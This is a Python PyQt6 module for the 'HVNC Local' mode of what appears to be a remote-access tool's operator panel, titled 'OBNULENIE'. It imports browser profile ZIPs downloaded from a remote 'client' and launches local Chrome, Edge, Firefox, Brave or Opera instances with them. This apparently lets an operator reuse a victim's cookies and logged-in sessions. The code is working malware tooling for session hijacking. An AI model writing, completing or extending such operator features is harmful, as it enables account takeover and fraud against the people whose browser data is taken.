"""Local Desktop Window for Operator.

Creates a local workspace where the operator can:
- Launch browsers with profiles downloaded from client
- View the client's screen in one panel
- Work locally with cloned session data

This is the "HVNC Local" mode implementation.
"""
from __future__ import annotations

import json
import logging
import os
import platform
import shutil
import subprocess
import tempfile
import zipfile
from pathlib import Path
from PyQt6 import QtCore, QtGui, QtWidgets

from .common import GlassFrame, make_button

logger = logging.getLogger(__name__)


class LocalBrowserManager:
    """Manages local browser instances with imported profiles."""
    
    # Browser executable paths
    BROWSER_PATHS = {
        "chrome": [
            r"C:\Program Files\Google\Chrome\Application\chrome.exe",
            r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
            "/usr/bin/google-chrome",
            "/usr/bin/chromium-browser",
            "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
        ],
        "edge": [
            r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
            r"C:\Program Files\Microsoft\Edge\Application\msedge.exe",
        ],
        "firefox": [
            r"C:\Program Files\Mozilla Firefox\firefox.exe",
            r"C:\Program Files (x86)\Mozilla Firefox\firefox.exe",
            "/usr/bin/firefox",
            "/Applications/Firefox.app/Contents/MacOS/firefox",
        ],
        "brave": [
            r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe",
            r"C:\Program Files (x86)\BraveSoftware\Brave-Browser\Application\brave.exe",
        ],
        "opera": [
            r"C:\Program Files\Opera\opera.exe",
            r"C:\Program Files (x86)\Opera\opera.exe",
        ],
    }
    
    def __init__(self):
        self._profile_dir = Path(tempfile.mkdtemp(prefix="remdesk_profiles_"))
        self._imported_profiles: dict[str, Path] = {}
        self._running_browsers: list[subprocess.Popen] = []
        self._is_windows = platform.system() == "Windows"
        
        logger.info("LocalBrowserManager initialized, profile dir: %s", self._profile_dir)
    
    def find_browser_exe(self, browser: str) -> str | None:
        """Find browser executable path."""
        paths = self.BROWSER_PATHS.get(browser.lower(), [])
        for path in paths:
            if os.path.exists(path):
                return path
        return None
    
    def import_profile(self, browser: str, zip_data: bytes) -> bool:
        """Import browser profile from ZIP data.
        
        Args:
            browser: Browser name
            zip_data: ZIP file contents
            
        Returns:
            True if import successful
        """
        try:
            profile_path = self._profile_dir / browser
            if profile_path.exists():
                shutil.rmtree(profile_path)
            profile_path.mkdir(parents=True)
            
            # Extract ZIP
            import io
            with zipfile.ZipFile(io.BytesIO(zip_data), 'r') as zf:
                zf.extractall(profile_path)
            
            self._imported_profiles[browser] = profile_path
            logger.info("Imported %s profile to %s", browser, profile_path)
            return True
            
        except Exception as e:
            logger.error("Failed to import %s profile: %s", browser, e)
            return False
    
    def import_profile_from_file(self, browser: str, zip_path: str) -> bool:
        """Import profile from ZIP file path."""
        try:
            with open(zip_path, 'rb') as f:
                return self.import_profile(browser, f.read())
        except Exception as e:
            logger.error("Failed to read profile ZIP: %s", e)
            return False
    
    def launch_browser(self, browser: str, url: str = None) -> subprocess.Popen | None:
        """Launch browser with imported profile.
        
        Args:
            browser: Browser name
            url: Optional URL to open
            
        Returns:
            Popen object or None
        """
        exe_path = self.find_browser_exe(browser)
        if not exe_path:
            logger.error("Browser %s not found", browser)
            return None
        
        profile_path = self._imported_profiles.get(browser)
        if not profile_path:
            logger.warning("No imported profile for %s, launching with default", browser)
            profile_path = self._profile_dir / f"{browser}_temp"
            profile_path.mkdir(parents=True, exist_ok=True)
        
        # Build command
        browser_lower = browser.lower()
        cmd = [exe_path]
        
        if browser_lower in ("chrome", "edge", "brave", "opera"):
            # Chromium-based
            cmd.extend([
                f"--user-data-dir={profile_path}",
                "--no-first-run",
                "--no-default-browser-check",
                "--disable-sync",
                "--window-position=100,100",  # Position window on visible area
                "--window-size=1280,800",      # Set reasonable window size
            ])
        elif browser_lower == "firefox":
            # Firefox
            cmd.extend([
                "-profile", str(profile_path),
                "-no-remote",
            ])
        
        if url:
            cmd.append(url)
        
        try:
            if self._is_windows:
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                proc = subprocess.Popen(cmd, startupinfo=startupinfo)
            else:
                proc = subprocess.Popen(cmd)
            
            self._running_browsers.append(proc)
            logger.info("Launched %s with profile %s", browser, profile_path)
            return proc
            
        except Exception as e:
            logger.error("Failed to launch %s: %s", browser, e)
            return None
    
    def get_imported_browsers(self) -> list[str]:
        """Get list of browsers with imported profiles."""
        return list(self._imported_profiles.keys())
    
    def close_all_browsers(self):
        """Close all running browser instances."""
        for proc in self._running_browsers:
            try:
                proc.terminate()
            except Exception:
                pass
        self._running_browsers.clear()
    
    def cleanup(self):
        """Cleanup all resources."""
        self.close_all_browsers()
        try:
            shutil.rmtree(self._profile_dir, ignore_errors=True)
        except Exception:
            pass


class LocalDesktopWindow(QtWidgets.QMainWindow):
    """Local desktop window for operator.
    
    Provides a workspace for launching browsers with client profiles.
    """
    
    closed = QtCore.pyqtSignal()
    
    def __init__(self, parent=None):
        super().__init__(parent)

        self.browser_manager = LocalBrowserManager()
        self._pending_profile_data: dict[str, bytes] = {}
        self._browser_names = {
            "chrome": "Chrome",
            "edge": "Edge",
            "firefox": "Firefox",
            "brave": "Brave",
            "opera": "Opera",
        }

        self.setWindowTitle("Local Desktop - OBNULENIE")
        self.setMinimumSize(760, 520)
        self.resize(980, 680)

        self._setup_ui()

    def _setup_ui(self):
        """Builds a glass-like workspace that matches the main app style."""
        central = QtWidgets.QWidget()
        central.setObjectName("LocalDesktopRoot")
        central.setAttribute(QtCore.Qt.WidgetAttribute.WA_StyledBackground, True)
        self.setCentralWidget(central)

        layout = QtWidgets.QVBoxLayout(central)
        layout.setSpacing(14)
        layout.setContentsMargins(18, 18, 18, 18)

        header_card = GlassFrame(radius=20, tone="card_alt", tint_alpha=160, border_alpha=70)
        header_card.setObjectName("ToolbarCard")
        header_layout = QtWidgets.QVBoxLayout(header_card)
        header_layout.setContentsMargins(16, 14, 16, 14)
        header_layout.setSpacing(6)

        header = QtWidgets.QLabel("Local Desktop")
        header.setObjectName("PageTitle")
        header_layout.addWidget(header)

        desc = QtWidgets.QLabel(
            "Launch browsers locally with profiles downloaded from the client.\n"
            "Use 'Browser Profiles' to download profiles first."
        )
        desc.setObjectName("PageSubtitle")
        desc.setWordWrap(True)
        header_layout.addWidget(desc)
        layout.addWidget(header_card)

        workspace = GlassFrame(radius=20, tone="card", tint_alpha=170, border_alpha=70)
        workspace.setObjectName("Card")
        workspace_layout = QtWidgets.QVBoxLayout(workspace)
        workspace_layout.setContentsMargins(14, 14, 14, 14)
        workspace_layout.setSpacing(12)

        import_group = QtWidgets.QGroupBox("Import Profile")
        import_layout = QtWidgets.QHBoxLayout(import_group)
        import_layout.setContentsMargins(12, 12, 12, 12)
        import_layout.setSpacing(10)

        self.import_btn = make_button("Import Profile ZIP...", "ghost")
        self.import_btn.clicked.connect(self._on_import_profile)
        import_layout.addWidget(self.import_btn)

        self.import_status = QtWidgets.QLabel("No profile imported")
        self.import_status.setObjectName("InlineStatus")
        self.import_status.setProperty("state", "warn")
        import_layout.addWidget(self.import_status, 1)

        workspace_layout.addWidget(import_group)

        browsers_group = QtWidgets.QGroupBox("Launch Browser")
        browsers_layout = QtWidgets.QGridLayout(browsers_group)
        browsers_layout.setContentsMargins(12, 12, 12, 12)
        browsers_layout.setHorizontalSpacing(8)
        browsers_layout.setVerticalSpacing(8)

        self.browser_buttons = {}
        browsers = ["chrome", "edge", "firefox", "brave", "opera"]

        for i, browser_id in enumerate(browsers):
            btn = make_button(self._browser_names[browser_id], "soft")
            btn.setMinimumHeight(42)
            btn.setEnabled(False)
            btn.clicked.connect(lambda _checked, b=browser_id: self._on_launch_browser(b))
            self.browser_buttons[browser_id] = btn
            browsers_layout.addWidget(btn, i // 3, i % 3)

        workspace_layout.addWidget(browsers_group)

        url_layout = QtWidgets.QHBoxLayout()
        url_layout.setSpacing(8)
        self.url_label = QtWidgets.QLabel("URL")
        self.url_label.setObjectName("CardSectionLead")
        url_layout.addWidget(self.url_label)

        self.url_input = QtWidgets.QLineEdit()
        self.url_input.setPlaceholderText("https://example.com")
        self.url_input.setClearButtonEnabled(True)
        url_layout.addWidget(self.url_input, 1)
        workspace_layout.addLayout(url_layout)

        self.status_label = QtWidgets.QLabel("Import a browser profile to get started")
        self.status_label.setObjectName("InlineStatus")
        self.status_label.setProperty("state", "warn")
        workspace_layout.addWidget(self.status_label)

        layout.addWidget(workspace, 1)
        layout.addStretch()

        footer_layout = QtWidgets.QHBoxLayout()
        footer_layout.setSpacing(8)

        self.close_browsers_btn = make_button("Close All Browsers", "ghost")
        self.close_browsers_btn.clicked.connect(self._on_close_browsers)
        footer_layout.addWidget(self.close_browsers_btn)

        footer_layout.addStretch()

        self.close_btn = make_button("Close Window", "soft")
        self.close_btn.clicked.connect(self.close)
        footer_layout.addWidget(self.close_btn)

        layout.addLayout(footer_layout)

    def _set_status_label(self, label: QtWidgets.QLabel, text: str, state: str) -> None:
        label.setText(text)
        label.setProperty("state", state)
        label.style().unpolish(label)
        label.style().polish(label)

    def _on_import_profile(self):
        """Handle import profile button click."""
        file_path, _ = QtWidgets.QFileDialog.getOpenFileName(
            self,
            "Import Browser Profile",
            "",
            "ZIP files (*.zip);;All files (*.*)",
        )
        if not file_path:
            return

        try:
            file_size = os.path.getsize(file_path)
            if file_size < 100:
                self._set_status_label(
                    self.import_status,
                    f"Error: File too small ({file_size} bytes)",
                    "error",
                )
                return

            with open(file_path, "rb") as handle:
                magic = handle.read(4)
                if magic[:2] != b"PK":
                    self._set_status_label(
                        self.import_status,
                        f"Error: File is not a zip file (magic: {magic[:4].hex()})",
                        "error",
                    )
                    logger.error(
                        "Invalid ZIP file magic bytes: %s (size: %d)",
                        magic.hex(),
                        file_size,
                    )
                    return

            with zipfile.ZipFile(file_path, "r") as zf:
                if "_profile_metadata.json" in zf.namelist():
                    metadata = json.loads(zf.read("_profile_metadata.json"))
                    browser = metadata.get("browser", "unknown")
                else:
                    filename = os.path.basename(file_path).lower()
                    browser = "unknown"
                    for browser_name in ["chrome", "edge", "firefox", "brave", "opera"]:
                        if browser_name in filename:
                            browser = browser_name
                            break

            if self.browser_manager.import_profile_from_file(browser, file_path):
                self._update_browser_buttons()
                self._set_status_label(self.import_status, f"Imported {browser} profile", "ok")
                self._set_status_label(self.status_label, f"Ready to launch {browser}", "ok")
            else:
                self._set_status_label(self.import_status, "Import failed", "error")

        except zipfile.BadZipFile as exc:
            self._set_status_label(self.import_status, "Error: Invalid ZIP file", "error")
            logger.error("BadZipFile: %s (file: %s)", exc, file_path)
        except Exception as exc:
            self._set_status_label(self.import_status, f"Error: {exc}", "error")
            logger.error("Import error: %s", exc)

    def _on_launch_browser(self, browser: str):
        """Handle launch browser button click."""
        url = self.url_input.text().strip() or None
        proc = self.browser_manager.launch_browser(browser, url)

        if proc:
            self._set_status_label(
                self.status_label,
                f"Launched {browser}" + (f" with {url}" if url else ""),
                "ok",
            )
        else:
            self._set_status_label(self.status_label, f"Failed to launch {browser}", "error")

    def _on_close_browsers(self):
        """Handle close all browsers button."""
        self.browser_manager.close_all_browsers()
        self._set_status_label(self.status_label, "Closed all browsers", "warn")

    def _update_browser_buttons(self):
        """Update browser button states based on imported profiles."""
        imported = set(self.browser_manager.get_imported_browsers())

        for browser, btn in self.browser_buttons.items():
            btn.setEnabled(True)
            if browser in imported:
                btn.setProperty("variant", "primary")
                btn.setText(f"{self._browser_names.get(browser, browser.title())} (Profile)")
            else:
                btn.setProperty("variant", "soft")
                btn.setText(self._browser_names.get(browser, browser.title()))
            btn.style().unpolish(btn)
            btn.style().polish(btn)

    def import_profile_data(self, browser: str, data: bytes):
        """Import profile from raw data (called from remote session)."""
        if self.browser_manager.import_profile(browser, data):
            self._update_browser_buttons()
            self._set_status_label(
                self.status_label,
                f"Imported {browser} profile from client",
                "ok",
            )

    def closeEvent(self, event: QtGui.QCloseEvent):
        """Handle window close."""
        self.browser_manager.cleanup()
        self.closed.emit()
        super().closeEvent(event)


def create_local_desktop() -> LocalDesktopWindow:
    """Create and return a local desktop window."""
    return LocalDesktopWindow()


